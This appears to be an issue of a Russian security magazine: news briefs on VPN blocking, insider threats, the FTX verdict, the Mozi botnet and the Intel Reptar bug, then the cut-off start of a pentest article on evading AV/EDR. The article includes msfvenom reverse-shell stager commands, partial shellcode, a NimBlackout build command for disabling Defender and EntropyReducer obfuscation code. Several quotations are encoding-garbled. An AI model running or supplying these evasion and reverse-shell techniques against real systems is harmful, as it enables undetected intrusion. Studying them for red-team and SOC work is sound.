   ем вредоносного соф та вырос ла с 71 до 83%. Основным каналом дос тавки по-прежнему оста-
   ются фи шинговые пись ма с фокусом на пер сонал ком паний, они занимают 2/3 от других
   атак с при менением вредоносов.

 РКН ЗАБЛОКИРУЕТ
 SHADOWSOCKS





  По  данным  СМИ,  Роскомнадзор  (РКН)  впер вые  вклю чил  протокол
  Shadowsocks  в  спи сок  VPN-сервисов,  подпадающих  под  блокировку.
  Для блокировки этого про токо ла ведомс тво будет использовать технические
  средства противодей ствия угро зам (ТСПУ) на трансгранич ных соеди нени ях.
     Как пишет изда ние «Коммерсант», созданный в Китае для обхо да цензуры
  про токол Shadowsocks чаще все го используют простые граждане для час тных
  VPN и ИБ-специалис ты. Так как он маскирует свой тра фик под другие ресур-
   сы, бло кировка может нарушить работу мно гих легаль ных сервисов.
     Ранее   в   сети   появи лось   письмо  Мин транса,   направленное
   в адрес 381 организа ции транспортной отрасли от 10 ноября 2023 года.
     Из докумен та сле дует, что Роскомнадзор может блокировать 49 VPN-сер-
  висов и протоколов через цен трализован ное управле ние сетью общего поль-
  зования (с помощью ТСПУ, которые установлены на сетях операторов связи
  по закону «о суверенном рунете»). Для обеспечения работы инфор мсистем,
  которые могут исполь зовать VPN для защищенных соединений и уда ленного
  доступа, организации должны предоставить информацию об используемых
  сервисах и протоколах до 15 нояб ря 2023 года.
    В Рос комнадзоре  отказались  от коммента риев  относитель но  этого
  документа, а в Минтрансе не ответили на запрос журналистов.
     Как сообщили изданию эксперты, чтобы избежать проблем с блокиров-
  ками корпоратив ных сетей, исполь зующих VPN, РКН запрашивает у раз ных
  отраслей информацию о том, какими сервисами они пользуются, а затем
  «создают ся так называемые белые списки».





  Как видно из таблицы выше, в спи сок ведомства вошел не толь ко про токол
  Shadowsocks, но даже сервис ItHelper рос сийско го раз работчика «Софт
  Программ», предназначенный для уско рения работы устройств со встро-
  енным VPN, под писка на который сво бодно про дается в «М.Видео-Эль-
  дорадо».
    Массовые проблемы с работой VPN-сервисов в России начались еще
  летом 2022 года. Тогда Рос комнадзор стал экспериментировать с бло киров-
  кой конкретных протоко лов (отмечались проблемы с L2TP, IKEv2 и IPsec), а в
   августе текуще го года пользователи ста ли сооб щать о проблемах в работе
  OpenVPN и WireGuard.
     Как объяснил собеседник «Коммерсан та», сначала Роскомнадзор бло-
  киро вал VPN по IP-адресам, однако они могут меняться, и приходится
   регулярно пополнять реестр. И если OpenVPN и WireGuard достаточно рас-
  пространенные протоколы, которые часто используются для пос троения
  защищенных соединений ком пании, от Shadowsocks они отличаются тем, что
  не маскируют тра фик при соеди нении, «пос коль ку исходно они не соз-
  давались для обхода цензуры и бло кировок». Поэто му  их,  в отличие
   от Shadowsocks, про ще заб локировать с исполь зовани ем средств ТСПУ.
     Другой источник издания уточнил, что блокиров ка Shadowsocks «через
  ана лиз трафика будет очень непростой из-за обфускации — высоки риски
   затронуть другие, впол не легаль ные сервисы».


  КОЛИЧЕСТВО ИНСАЙДЕРСКИХ АТАК УВЕЛИЧИЛОСЬ
 В 1,5 ÐÀÇÀ

   Эк сперты ком пании «Инфосистемы Джет» провели исследование, посвященное инсайдерским
   угрозам.

  С начала 2023 года инсайдерские атаки от рядовых пользователей увеличились в 1,5 раза
   по срав нению с аналогичным периодом прошлого года.

   Спрос на инсай дер скую информацию за первое полугодие 2023 года вырос на 25%.

   У 70% ком паний обнаружи ваются критич ные недос татки в про цес се управле ния доступом. И в
   подавляющем боль шинс тве случаев  (83%) в рам ках внутреннего тес тирования на про ник-
   новение удается получить доступ к критич ной информации с правами обыч ного пользователя.


   Самыми опас ными инсай дерами становят ся текущие работники, работ ники с при виле гирован-
   ными пра вами дос тупа, а также работ ники под рядчиков, име ющие дос туп к корпоративным
   ресурсам.





  В даркнете и Telegram-каналах также есть пос тоянный спрос на покупку и про дажу инсай дер-
   ской информации. Объявления такой нап равленности сос тавляют около тре ти всех пред-
   ложений на теневом рынке (это может быть покупка и продажа дос тупов к корпоративным
   сетям или поиск готовых сотрудничать со злоумыш ленниками работников ком паний).


   Основными при чинами успеха инсайдерских атак становятся отсутствие или недостаточность
   контро ля за несанкционирован ными действиями  (78%), отсутс твие своевременного реаги-
   рова ния на инциденты (62%) и наличие избыточных прав дос тупа (59%).





                                        Продолжение статьи →
← Начало статьи
 БЭНКМАН-ФРИД
 ПРИЗНАН
 ВИНОВНЫМ





  Федеральный суд с участием присяж ных заседа телей приз нал основателя
  и быв шего главу криптовалютной биржи FTX и фонда Alameda Research Сэма
  Бэнкмана-Фри да виновным по семи пун ктам обвинения. Мак симальный срок
  лишения сво боды по этим обвинениям составля ет 110 лет.
    Напоми наем, что мы посвятили кра ху FTX и скандалу, связанному с ее бан-
   кротством, большую статью.
     Судеб ный про цесс проходил в окружном суде США по Южно му округу
  Нью-Йор ка, расположенном на Манхэттене. В об винительном заключении
   сказано, что Сэм Бэнкман-Фрид «присвоил и растратил средства кли ентов
  FTX и использовал миллиарды долларов похищенных средств... для собствен-
  ного обогаще ния; поддержа ния деятельнос ти FTX; финансирования спе куля-
   тив ных венчурных инвести ций; сделал более ста мил лионов долларов взно-
  сов в избирательные кампании демократов и республиканцев с целью пов-
   лиять на криптовалют ное регули рова ние; а так же для оплаты операционных
  рас ходов Alameda». Также его обвинили в том, что он делал «ложные
  и мошенничес кие заявления и утверждения для инвесторов FTX и кредито ров
   Alameda».
    В список из се ми обвинений входят:
   • мо шен ничество с использованием электронных средств свя зи;
   • сговор с целью совер шения мошенничес тва с использовани ем электрон-
     ных средств связи против клиентов FTX;
   • мо шен ничество с использованием элек тронных средств связи по отно-
    шению к кредито рам Alameda Research;
   • сговор с целью совер шения мошенничес тва с использовани ем электрон-
     ных средств связи в отношении кредиторов Alameda Research;
   • сговор  с целью  совершения мошен ничества  с ценными  бумагами
     инвесто ров FTX;
   • сговор с целью совер шения мошенничества с ценными бумагами кли-
     ентов FTX в свя зи с покуп кой и продажей криптовалюты и свопов;
   • сговор с целью отмывания денег.

  Пять обвинений, связанных с мошенничеством с использованием электрон-
  ных средств связи и отмыванием денег, предус матривают максималь ное
  наказание в виде двадцати лет лишения сво боды за каждое, а оставшиеся
  два обвинения — в виде пяти лет лишения сво боды за каж дое.
    Присяж ные вынесли вердикт после примерно четырех часов обсуждения.
  Фактический приговор быв шему главе FTX будет вынесен и оглашен 28 мар-
   та 2024 года.
    На этом процессе Сэм Бэнкман-Фрид, который так и не признал себя
  виновным, решил дать показания в свою защиту и попытал ся переложить
  вину за случив шееся на дру гих. Сообщается, что на вопросы обвинения он
  боль ше ста раз отве чал «я не уверен» или «я не помню», избе гая пря мых
  отве тов.
     Также он заявил, что допустил ошиб ки, управляя FTX (например, не сфор-
  мировал коман ду по управлению рисками), но не похищал средства клиентов.
  Бэнкман-Фрид подчерки вал, что, по его собс твенному мнению, заимс тво-
   вания, которые Alameda делала у FTX, были раз решены, и он не осознавал,
  нас колько велики долги, пока дело не дош ло до краха обеих компаний.
     Три экс-руково дителя FTX и дочерней Alameda Research (Гэри Ван, Нишад
  Сингх и быв шая девушка Бэнкмана-Фри да Кэролайн Эллисон) признали свою
  вину и дали показания против бывшего руково дителя. В своих показаниях они
  заявили, что Бэнкман-Фрид нап равлял их на совершение прес тупле ний, в том
  числе помогал Alameda разграблять FTX, а так же лгал кредиторам и инвесто-
  рам о настоящем положении дел в компаниях.
    В нояб ре были представлены заключительные аргументы сторон, и судеб-
  ный процесс, длив шийся около месяца, подошел к концу.
    В суде про курор США Николас Роос заявлял, что нет никаких серьезных
  сомнений в том, что 10 миллиардов долларов средств, принад лежащих кли-
  ентам FTX, про пали, и что теперь присяжные должны решить, знал ли Бэн-
  кман-Фрид о том, что его дей ствия были неп равомерными.

         «Ýòî áûëà öåëàÿ ïèðàìèäà îáìà íà, ïîñ òðîåííàÿ ïîä ñóäèìûì íà ôóí-
        äàìåíòå èç ëæè è ëîæíûõ îáå ùàíèé, è âñå ýòî äëÿ òîãî, ÷òîáû «
         ïîëó÷èòü äåíüãè, — ñêà çàë Ðîîñ. — Â èòîãå îíà ðóõíóëà, îñòà âèâ ïîñ ëå
         ñåáÿ òûñÿ÷è æåðòâ».                 »
  Защитник экс-главы FTX Марк Коэн настаивал на том, что Бэнкман-Фрид
  допускал ошиб ки, но не совершал преступлений:


         «Áèç íåñ ðåøåíèÿ, ïðèíÿòûå èç  ëó÷ øèõ ïîáóæäåíèé, íå ÿâëÿþòñÿ
        îñíîâàíèåì äëÿ îñóæäåíèÿ, — çàÿâ ëÿë Êîýí. — Ïëîõîå óïðàâëå íèå «
        ðèñ êàìè — ýòî íå ïðåñ òóïëå íèå. Ïëîõèå áèç íåñ ðåøåíèÿ — íå ïðåñ-
         òóïëå íèå».                 »
  Сторона обвинения срав нивала эту аргумен тацию с тем, «как если бы кто-то
  огра бил юве лирный магазин и оправдывал свои дей ствия тем, что там
  не было охранника». «Обвиняемый знал, что поступа ет неп равильно, и имен-
  но поэтому не стал нанимать специалистов по управлению рисками», — нас-
  таивал прокурор Дани эль Сас сун.
     Хо тя завершивший ся судебный процесс охватывал семь уголовных обви-
   нений, в общей сложности Бэнкману-Фри ду были предъ явле ны обви нения
  по две надцати пунктам. Отдельное судебное разбирательство, зап ланиро-
  ванное на март 2024 года, будет посвящено оставшим ся обвинениям,
  а именно мошен ничеству против клиентов FTX в связи с покупкой и про дажей
  деривативов, мошенничеству с ценными бумагами клиентов FTX, сговору
  с целью совершения банковского мошенничес тва, сговору с целью ведения
  нелицензирован ного биз неса по перево ду денег, а также сговору с целью
  наруше ния анти кор рупци онных положений Закона о противо действии кор-
  рупции за рубежом.
     После оглашения вердикта при сяжных адвокат Марк Коэн заявил, что
  «разоча рован», но уважает их решение.

        «Ìèñ òåð Áýíêìàí Ôðèä íàñ òàèâàåò íà ñâîåé íåâèíîâ íîñòè è áóäåò
        ïðîäîëæàòü àêòèâíî áîðîòüñÿ ñ âûä âèíóòû ìè ïðîòèâ íåãî îáâèíåíè- «
         ÿìè», — ñîîáùèë ïðåñ ñå Êîýí.                 »
  Стоит отме тить, что с августа 2023 года Бэнкман-Фрид находится в тюрьме,
   куда попал пос ле того, как судья отменил его за лог и домаш ний арест, при дя
   к выводу, что быв ший глава FTX, вероятно, пытался манипулировать сви дете-
   лями.


  АУДИТОРИЯ TELEGRAM В РОССИИ ВЫРОСЛА
 ДО 82,3 ÌÈËËÈÎÍÀ ЧЕЛОВЕК

   Иссле дова тельская ком пания Mediascope под считала, что аудитория Instagram (принадлежит
   корпорации Meta, деятель ность которой признана экс тре мист ской и зап рещена в РФ) пос ле
   блокировки продол жает падать. По итогам октября 2023 года месячный охват платформы
   в  России  составил  всего  25,1 миллиона  человек —  в  2,5  раза  меньше,  чем
   в октябре 2021 года.


   При этом ауди тория Facebook, также принадлежащей Meta, еще в 2022 году сократилась
   в 2,3 раза, с 41,3 миллиона до 18 миллионов человек, но с тех пор этот показатель
   не менял ся.





   Главным бенефи циаром происходящего стал Telegram: по итогам октября 2023 года охват этой
   платформы сос тавил 82,3 миллиона человек, что на 15% боль ше, чем в октябре 2022 года,
   и на 62% боль ше, чем в октябре 2021 года. Отме чается, что при этом рост других рос сий ских
   соц сетей («Вконтакте» и «Одноклассников») замет но замедлился.

 БОТНЕТ MOZI
 ОТКЛЮЧИЛСЯ





  Спе циалисты строят теории о загадочном отклю чении ботнета Mozi, который
  недавно был лик видиро ван с помощью специального «рубиль ника», пред-
  назна ченного для деактивации всех ботов.
     Mozi — известный DDoS-ботнет, появивший ся еще в 2019 году и нацелен-
  ный в первую очередь на IoT-устрой ства, такие как маршру тизаторы, DVR
  и другие гаджеты, под клю ченные к интернету. Эта малварь исполь зовала
  известные  уяз вимос ти и слабые пароли для ком прометации устройств
  и вклю чения их в свою P2P-сеть, где они взаимодей ствовали с помощью про-
   токо ла BitTorrent DHT.
    В июне 2021 года китай ская ИБ-компания Qihoo 360 сооб щала, что Mozi
  нас читывает око ло 1,5 миллиона заражен ных устройств, более 800 тысяч
   находят ся в Китае. Спустя нес колько недель после этого компания рас ска-
  зала, что помогала правоохранительным органам в арес те предполага емых
  раз работ чиков Mozi, отметив при этом, что сам бот нет, скорее все го, сох-
  ранит жизнеспо собность и продолжит работу.
     Как сооб щили теперь специалис ты компании ESET, резкое падение
  активнос ти Mozi началось еще 8 августа 2023 года с остановки всех опе-
  раций бот нета в Индии. За этим 16 августа 2023 года последовало аналогич-
  ное вне зап ное прекращение деятельности в Китае, на родине ботнета.





  Затем 27 сентября 2023 года всем ботам Mozi восемь раз было отправлено
  оди наковое UDP-сооб щение с указани ем заг рузить обновле ние через HTTP,
  которое при вело к сле дующему:
   • лик видация вре донос ного процесса Mozi;
   • от клю чение некоторых системных служб (sshd и dropbear);
   • замена фай ла Mozi;
   • выполнение команд конфигурации на устрой стве;
   • блокировка доступа к различным портам;
   • соз дание плацдарма для нового файла.

  Ис сле дователи считают, что это была контролируемая лик видация,  так
   как человек, активировавший этот «рубильник», решил подготовить заражен-
  ные системы для новой полез ной наг рузки, которая может пинговать уда лен-
  ный сервер.
     Анализ  кода,  про веденный  исследова телями,  показал  значительное
  сходс тво между ори гинальным кодом Mozi и бинарными файлами, исполь-
  зованными при уничтожении ботнета, в которых были указаны коррек тные
  при ват ные  клю чи  для  подписи  пей лоада. По  мне нию  специалистов,
   это намекает на при частность  к уничтожению ботнета его соз дателей
  или китай ских пра воох ранитель ных органов.


         «Óíè÷ òîæåíèå îäíîãî èç ñàìûõ ìîù íûõ IoT-áîòíåòîâ ïðåä ñòàâ ëÿåò
        ñîáîé  èíòå ðåñ íûé  ñ  òî÷ êè  çðå íèÿ  êèáåð êðèìèíà ëèñ òèêè  ñëó ÷àé, «
       äàþùèé íàì èíòðèãóþùóþ òåõíè÷åñ êóþ èíôîðìà öèþ î òîì, êàê ñîç-
        äàþòñÿ, ðàáîòà þò è ëèê âèäèðó þòñÿ ïîäîáíûå áîòíåòû», — ïèøóò àíà-
         ëèòèêè ESET.                 »

 ТЕЛЕКОМЫ СТАНОВЯТСЯ ЖЕРТВАМИ DDOS

   Аналити ки груп пы ком паний «Гарда» провели исследование изменений ландшафта и особен-
   ностей DDoS-атак в третьем квартале 2023 года.

   Доля флу да TCP SYN зна читель но вырос ла, достигнув 60%. На вто ром месте (20%) рас-
   положился флуд TCP ACK, а UDP-флуд занимает третье мес то с 13%.

   Доля атак типа DNS Amplication сос тавила все го 3%, показав снижение по сравнению со вто-
  рым квар талом, а доля NTP Amplication и вов се упала с 9 до 1%.





   На иболь ший объ ем атак был зарегис трирован на сетях телеком операторов. Это объ ясня-
   ется тем, что операторы интенсивно борются с DDoS-атаками, защищая как собствен ные объ-
   екты, так и ресур сы своих кли ентов, размещенные в той же инфраструктуре.

   На втором мес те ока залась сфера транспор та и перевозок. На третьем — ресурсы гос-
   сектора.





   Также исследователи отме тили неожиданно большое количество атак на топливно энер-
   гетический комплекс и промыш ленность. По их мнению, это может говорить о попытках
   хакеров воздей ство вать на сектор реальной экономики.

 БАГ REPTAR
 УГРОЖАЕТ ЧИПАМ
 INTEL





  Компания Intel устранила серьезную уязвимость в про цессорах для дескто-
   пов, серверов, мобильных устройств и встра иваемых систем, включая новей-
  шие микроархитектуры Alder Lake, Raptor Lake и Sapphire Rapids. Проблема
  может использовать ся для повышения привиле гий, получения дос тупа к кон-
  фиден циальной информации и провоцирова ния отказа в обслуживании.
     Уяз вимость, обнаружен ная самими инженерами  Intel, получила иден-
  тификатор CVE-2023-23583 и опи сывается как «проблема избы точного пре-
  фик са».
     Изначально считалось, что эта ошибка может использоваться только
  для про воцирования отказа в обслужива нии (уязвимость получи ла толь-
   ко 5,5 балла по шкале CVSS), и Intel планировала выпустить патч для нее
   в марте 2024 года. Одна ко более глубокий ана лиз показал, что существует
  спо соб использовать баг для повышения привилегий, поэтому Intel перенес-
  ла дату выхода пат ча на ноябрь 2023 года. В итоге оценка уяз вимости изме-
  нилась и теперь сос тавляет 8,8 балла по шка ле CVSS.

        «Ïðè îïðå äåëåííûõ îáñòîÿòåëüñòâàõ íà ìèê ðîàð õèòåê òóðàõ Intel âûÿâ-
        ëåíû ñëó ÷àè, êîãäà âûïîëíåíèå èíñ òðóê öèè (REP MOVSB), çàêîäè- «
        ðîâàííîé ñ èçáû òî÷ íûì ïðå ôèê ñîì REX, ìîæåò ïðèâîäèòü ê íåï ðåä-
         ñêà çóåìîìó ïîâåäå íèþ ñèñ òåìû, âûçûâà þùå ìó êðèòè÷åñ êèé ñáîé
        èëè çàâèñà íèå, à â íåêîòîðûõ ñöå íàðèÿõ — ê ïîâûøå íèþ ïðèâèëå ãèé
         ñ CPL3 äî CPL0, — ñîîáùàþò èíæå íåðû Intel. — Intel íå ðàñ ñ÷èòûâà åò,
         ÷òî êàêîå ëèáî íåâ ðåäîíîñ íîå ïðîãðàì ìíîå îáåñ ïå÷åíèå ñòîëêíåòñÿ
         ñ ýòîé ïðîáëåìîé â ðåàëüíûõ óñëîâèÿõ. Îæèäàåòñÿ, ÷òî èçáû òî÷ íûå
        ïðå ôèê ñû REX íå áóäóò ïðèñóòñ òâîâàòü â êîäå è ãåíåðèðîâàòüñÿ êîì-
         ïèëÿòîðàìè.  Âðå äîíîñ íàÿ  ýêñ ïëó àòà öèÿ  ýòîé  ïðîáëåìû  òðå áóåò
        âûïîëíåíèÿ ïðîèçâîëüíîãî êîäà. Òàê æå â ðàì êàõ âíóòðåííåé ïðîâåð-
          êè, ïðîâåäåííîé â êîíòðîëèðó åìîé ëàáîðà òîð íîé ñðå äå, Intel âûÿâèëà
         âîç ìîæíîñòü ïîâûøå íèÿ ïðèâèëå ãèé â îïðå äåëåííûõ ñöå íàðèÿõ».                 »
  Системы с уязвимыми про цессорами, в том числе с Alder Lake, Raptor Lake
  и Sapphire Rapids, уже получили обновленные микрокоды, причем эти патчи
  не оказывают вли яния на производительность.
     Также ком пания выпустила обновления мик рокода для дру гих про цес-
   соров. Поль зователям рекомендует ся обно вить BIOS, ОС и драйверы, чтобы
   получить патчи от OEM-про изводителей, пос тавщиков ОС и пос тавщиков
  гипервизоров.
     Полный список про цессоров, затронутых уязвимостью CVE-2023-23583,
  а также рекомендации по ее устранению дос тупны на сайте Intel.
     Эксперт Google Тэвис Орманди (Tavis Ormandy) сооб щил, что ту же уяз-
  вимость самос тоятельно обнаружи ли нес коль ко исследовательских групп
   Google, включая Google Information Security Engineering и коман ду  silifuzz,
  которые дали проб леме имя Reptar.
     Как пояснил вице-президент и CISO Google Cloud Фил Венаблс  (Phil
   Venables), баг связан с тем, «как избы точные префик сы интерпретируются
  про цессором, что в слу чае успешной эксплуата ции приводит к обходу защит-
  ных гра ниц».
    По данным спе циалистов Google, зло умышленник в многопользователь-
  ской виртуальной среде может использовать эту уязвимость для атаки на гос-
  тевую машину, что приведет к отклю чению хос та и отказу в обслуживании
  для других гостей на этом хос те. Также, как уже отмечалось выше, проблема
  может помочь раскрыть информацию и повысить привилегии.





   Критичес кий баг в Atlassian Conuence приводит к потере дан ных


  Об наружен под польный сервис для сокращения URL


   Для борь бы с рас пространением мал вари Discord будет исполь зовать вре менные ссылки


   LockBit взломала Boeing и сливает похищен ные данные


   Алгоритмы стандарта транкинговой связи TETRA станут дос тупны широкой пуб лике


   Ата ка CacheWarp позволяет обойти защиту AMD SEV и получить root-доступ


   Иссле дова тели извлекают ключи RSA из SSH-трафика


   Криптовалют ные кошельки 2011–2015 годов уязвимы перед проблемой Randstorm


   Разработ чики Lumma заявили, что могут восстановить устаревшие cookie Google


   Пароли адми нис траторов раскрыты из-за критичес кого бага в ownCloud
COVERSTORY





Антивиру сы и сис темы EDR становятся всё
наворо ченнее и даже используют машин-
ное обучение для более точного детек-
тирования. Но у авторов малвари по-преж-
нему остаются способы обойти все про-           Кристина Гук                                                                                  Специалист по тестированию
верки. В этой статье я покажу несколько        на проникновение в RTM                                                                                            Group
тех ник и инстру мен тов, которые при меняют           deadunii@yandex.ru
злоумыш ленники.


Материал призван помочь практикующим специалис там по пентесту и SoC-
ана лити кам разобраться с тем, как зло умышленни ки могут проникать в сис-
темы, минуя EDR (endpoint detection & response).




                        Статья имеет озна комительный характер и пред-
                       назна чена для специалис тов по безопас ности,
                      про водящих тестирова ние в рамках контракта.
                       Автор  и  редак ция  не  несут  ответс твенности
                        за любой вред, причинен ный с применением
                       изложенной информа ции. Распространение вре-
                      донос ных прог рамм, наруше ние работы систем
                      и  нарушение  тайны  переписки  прес ледуются
                      по закону.



ÍÀ ×ÅÌ ÌÛ ÒÅÑÒÈÐÎÂÀËÈ

Для  иссле дова ний  мы  использовали  Kaspersky   Endpoint   Detection
and Response и его вариацию для Linux (KESL), опенсор сный ClamAV, McAﬀee,
Microsoft Defender Advanced Threat Protection, а также VirusTotal.
  Конечная цель — получить обратное соеди нение на наш C2-сервер, роль
которого будет исполнять Metasploit Framework, один из самых популярных
пентестерских инструментов.
  За пос ледние годы АV и EDR научились уже на ранних стадиях обнаружи-
вать файлы, которые были сгенери рованы Metasploit, потому что сущес твует
множество сигнатур для выявления уста новки bind- и reverse-шеллов. EDR
определяют, какие файлы  .dll и  .so используют ся при старте оболочки
Meterpreter, и это лишь малая часть признаков, помогающих выявить вре-
доносный процесс. Для чис тоты эксперимента мы возьмем шелл-код, сге-
нерированный через msfvenom, и будем пытаться его модернизиро вать.
  Но для начала посмотрим, сколько сейчас дает баллов VirusTotal на дефол-
тный exe-стейджер, сге нерированный следующей командой:


msfvenom -p windows/meterpreter/reverse_tcp LHOST= eth0 LPORT= 444 -f
exe -o ab.exe





                 Резуль таты проверки на VirusTotal

То есть стандар тный стейджер без проб лем обна руживается современными
защит ными решениями.
  Давай попробуем сделать вариант с обходом. Будем генерировать
шелл-код на С, так как это идеальный выбор, если нам нужна скорость
и кросс-платформенность.
   Вот как выг лядит наш первоначальный шелл-код:



  $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=eth0 LPORT=444-f c


  [-] No platform was selected, choosing Msf::Module::Platform::Windows
  from the payload


  [-] No arch selected, selecting arch: x86 from the payload
  No encoder specified, outputting raw payload


  Payload size: 354 bytes


  Final size of c file: 1518 bytes


  unsigned char buf[] =
  "\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x89"
  "\xe5\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"


  ...


  "\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff"
  "\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a"
  "\x00\x53\xff\xd5";


Ни чего необычного. Шелл-код просто дает реверс-шелл, а обмен данных
про исхо дит по TCP. Мы даже не применяли шифрование и кодирование.





В пос ледние годы большинство вендоров AV/EDR внедрили поведенческий
ана лиз с исполь зованием машинного обучения, что позволя ет более точно
ана лизи ровать поведение программы и клас сифицировать ее как вредонос-
ную. Для этого проводится постоянный мониторинг процес са: EDR сравнива-
ет дей ствия с про филя ми поведения. Это повышает шансы обнаружения,
но наг ружает систему, может приводить к ложным сра баты ваниям и конфлик-
там с другим ПО.
  И конечно, по-прежнему актуальны старые методы:
 • эв ристи ческий анализ;
 • сигнатурный ана лиз
 • сендбок синг;
 • IAT checking (про вер ка используемых фун кций и библиотек. Например,
   если в IAT есть функции шиф рования, то EDR может решить, что перед ним
  шифровальщик);
 • API hooking (перех ват вызовов функций и перенап равление потока кода).

В общем, чем дальше, тем больше всяких проверок.





                     На  сетевом  уровне  сущес тву ет  нес коль ко
                       методов, которые можно исполь зовать,  чтобы
                       попытаться  избежать  обнаруже ния:  DNS-тун-
                      нелирование,  самоподписан ные  сертификаты
                      HTTPS, про токол ICMP. Одна ко современные сис-
                     темы обнаружения угроз не поддают ся на все эти
                        уловки.



ÔÐÅÉÌÂÎÐÊÈ ÄËß ÎÁÕÎÄÀ AV/EDR

NimBlackout
NimBlackout поз воляет удалить AV/EDR при помощи уязвимого драй вера.
Драйвер GMER используется для взаимодей ствия с ядром операционной
системы и дает возможность обна руживать и анализировать скры тые вре-
доносные эле менты.
   Программа написа на на Nim, давай скомпилируем ее на Linux:


nim --os:windows --cpu:amd64 --gcc.exe:x86_64-w64-mingw32-gcc --gcc.
linkerexe:x86_64-w64-mingw32-gcc c NimBlackout.nim

На выходе получи ли PE, в который нужно передать про цесс с антивирусом.
  Далее надо установить уяз вимый драй вер в ОС и запустить наш исполня-
емый файл.





                   Установка драй вера и запуск .exe

Эта атака нацелена на Microsoft Defender. Однако тут есть одно но: версия
GMER из этого PoC может не сра ботать на Windows 11 и последних версиях
Windows 10. Более того, для запуска нам нужно иметь привиле гии локального
адми нистратора.


EntropyReducer
Как ты, возможно, знаешь, энтропия — это степень слу чайнос ти в заданном
наборе дан ных. Существуют разные способы изме рять энтропию, в нашем
контексте под этим термином мы будем подразумевать энтропию Шеннона,
которая дает значение от 0 до 8. С увеличением уровня случайности в наборе
данных уве личи вается и значение энтро пии.
  Двоичные файлы вре донос ного ПО зачас тую имеют более высокую энтро-
пию, чем обычные фай лы. Высокая энтро пия — явный показа тель сжатых,
зашифрованных или упа кованных данных, которые используются вредонос-
ными программами для скрытия сигнатур.
  Для при мера посчитаем энтропию от обычного meterpreter/reverse_tcp.
Сна чала сгенерируем файл:


msfvenom -p windows/meterpreter/reverse_tcp LHOST = eth0 LPORT =
4444 -f raw -o entropy.bin

Для под сче та энтро пии мы будем использовать PeStudio.





                Под счет энтропии файла entropy.bin

Ре зультат неутешительный — 6,265, и, как мы видим, PeStudio сразу может
пре дос тавить информацию о том, какие антивирусы классифици ровали .bin
как вредоносный файл.
   Если число бли зится к 8, значит, с огромной вероятностью файл вре-
доносный. Это отме чено в гистограмме ниже.





                    Гистограмма энтропии фай лов

Как нам сни зить это значение? Тут поможет инструмент EntropyReducer.
   EntropyReducer сначала проверя ет, кра тен ли раз мер полезной нагрузки
BUFF_SIZE (эта переменная указывает на количес тво байтов в полезной наг-
рузке, после которых будут добавлены пустые бай ты, NULL_BYTES). Если нет,
он уве личивает его до необ ходимого зна чения.


// This will represent the seraizlized size of one node
#define SERIALIZED_SIZE (BUFF_SIZE + NULL_BYTES + sizeof(INT)
// Serialized payload size: SERIALIZED_SIZE * (number of nodes)
// Number of nodes: (padded payload size) / BUFF_SIZE

Затем он берет каждый блок BUFF_SIZE из полез ной нагрузки и создает
для него узел связ ного списка с помощью функции InitializePayloadList.


BOOL InitializePayloadList(IN PBYTE pPayload, IN OUT PSIZE_T
sPayloadSize, OUT PLINKED_LIST* ppLinkedList);


PLINKED_LIST InsertAtTheEnd(IN OUT PLINKED_LIST LinkedList, IN PBYTE
pBuffer, IN INT ID);


VOID MergeSort(PLINKED_LIST* top, enum SORT_TYPE eType)

У соз данного узла пустой буфер размером NULL_BYTES. Этот буфер будет
при меняться для снижения энтропии.
  Затем EntropyReducer продолжает случайным образом менять порядок
каждого узла в связном списке, нарушая порядок исходной полез ной наг-
рузки. Этот шаг выпол няется с помощью алгорит ма сортировки слиянием,
который реали зован в функции MergeSort.


case SORT_BY_BUFFER: {
  iValue1 = (int)(top1->pBuffer[0] ^ top1->pBuffer[1] ^ top1->pBuffer
[2]); // calculating a value from the payload buffer chunk
  iValue2 = (int)(top2->pBuffer[0] ^ top2->pBuffer[1] ^ top2->pBuffer
[2]); // calculating a value from the payload buffer chunk
  break;
}

Отсорти рованный связный список хранит ся в слу чайном порядке, потому что
зна чение, по которому он сортиру ется, — это значение XOR первых трех бай-
тов исходной полезной наг рузки. Именно оно определяет позицию в реор-
ганизованном связном списке.


BOOL Obfuscate(IN PBYTE PayloadBuffer, IN SIZE_T PayloadSize, OUT
PBYTE* ObfuscatedBuffer, OUT PSIZE_T ObfuscatedSize) {
PLINKED_LIST pLinkedList = NULL;
*ObfuscatedSize = PayloadSize;
// Convert the payload to a linked list
if (!InitializePayloadList(PayloadBuffer, ObfuscatedSize, &
pLinkedList))
return 0;


// ObfuscatedSize now is the size of the serialized linked list
// pLinkedList is the head of the linked list
// Randomize the linked list (sorted by the value of 'Buffer[0] ^
Buffer[1] ^ Buffer[3]')
MergeSort(&pLinkedList, SORT_BY_BUFFER);


// printf("---------------------------\n\n");
// PrintList(pLinkedList);
// printf("---------------------------\n\n");


PLINKED_LIST pTmpHead = pLinkedList;
SIZE_T BufferSize = NULL;
PBYTE BufferBytes = (PBYTE)LocalAlloc(LPTR, SERIALIZED_SIZE);


// Serailize the linked list
while (pTmpHead != NULL) {
  // This buffer will keep data of each node
  BYTE TmpBuffer [SERIALIZED_SIZE] = { 0 };
  // Copying the payload buffer
  memcpy(TmpBuffer, pTmpHead->pBuffer, BUFF_SIZE);
  // No need to copy the 'Null' element, cz its NULL already
  // Copying the ID value
  memcpy((TmpBuffer + BUFF_SIZE + NULL_BYTES), &pTmpHead->ID, sizeof(
int));
  // Reallocating and moving 'TmpBuffer' to the final buffer
  BufferSize += SERIALIZED_SIZE;
  if (BufferBytes != NULL) {
    BufferBytes = (PBYTE)LocalReAlloc(BufferBytes, BufferSize,
LMEM_MOVEABLE | LMEM_ZEROINIT);
    memcpy((PVOID)(BufferBytes + (BufferSize - SERIALIZED_SIZE)),
TmpBuffer, SERIALIZED_SIZE);
  }
  // Next node
  pTmpHead = pTmpHead->Next;
}


// 'BufferBytes' is the serailized buffer
*ObfuscatedBuffer = BufferBytes;
if (*ObfuscatedBuffer != NULL && *ObfuscatedSize > PayloadSize)
  return 1;
else
  return 0;
}

Пос коль ку сохранение списка в файле невоз можно из-за того, что он уже
связан указателями, при ходит ся делать сери али зацию с помощью функции
Obfuscate. После этого выполняется запись в output_file.
   Вот что выдает VirusTotal при ана лизе.





                 Резуль таты проверки на VirusTotal

Те перь модифицируем файл через EntropyReducer.

